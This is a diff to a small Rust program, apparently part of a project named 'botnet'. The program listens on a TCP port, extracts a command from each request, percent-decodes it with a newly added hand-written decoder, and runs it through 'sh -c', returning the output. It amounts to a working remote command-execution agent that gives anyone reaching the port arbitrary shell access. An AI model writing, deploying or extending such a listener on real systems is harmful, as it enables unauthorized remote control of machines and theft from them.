@@ -4,12 +4,10 @@ use std::net::{TcpListener, TcpStream};
 use std::process::{Command, Stdio};
 use std::env;
 
-use percent_encoding::percent_decode;
-
 use botnet::ThreadPool;
 
 fn main() {
-    let addr = env::args().nth(1).unwrap_or("127.0.0.1:7878".to_owned());
+    let addr = env::args().nth(1).unwrap_or_else(|| "127.0.0.1:7878".to_owned());
     let listener = TcpListener::bind(&addr).unwrap();
     let pool = ThreadPool::new(4);
 
@@ -22,6 +20,38 @@ fn main() {
     }
 
     eprintln!("Shutting down.");
+}
+
+fn ascii_to_num(a: u8) -> Option<u8> {
+    if a.is_ascii_digit() {
+        Some(a - b'0')
+    } else if a.is_ascii_hexdigit() {
+        Some(a.to_ascii_lowercase() - b'W')
+    } else {
+        None
+    }
+}
+
+// Not sure about correctness
+fn decode_percent(buf: &[u8]) -> Option<String> {
+    let mut iter = buf.iter();
+    let mut s = String::new();
+
+    while let Some(c) = iter.next() {
+        match c {
+            b'%' => {
+                let mut a: u8 = *iter.next()?;
+                let mut b: u8 = *iter.next()?;
+
+                a = ascii_to_num(a)?;
+                b = ascii_to_num(b)?;
+
+                s.push(char::from((a << 4) + b));
+            },
+            b => s.push(char::from(*b)),
+        }
+    }
+    Some(s)
 }
 
 fn get_cmd(buf: &[u8]) -> Option<&[u8]> {
@@ -74,13 +104,13 @@ fn handle_connection(mut stream: TcpStream) -> Option<()> {
         return None;
     };
 
-    let cmd = percent_decode(cmd).decode_utf8().ok()?;
+    let cmd = decode_percent(cmd)?;
 
     eprintln!("Run: '{}'", cmd);
 
     let child = Command::new("sh")
         .arg("-c")
-        .arg(cmd.as_ref())
+        .arg(cmd)
         .stdout(Stdio::piped())
         .stderr(Stdio::null())
         .spawn()
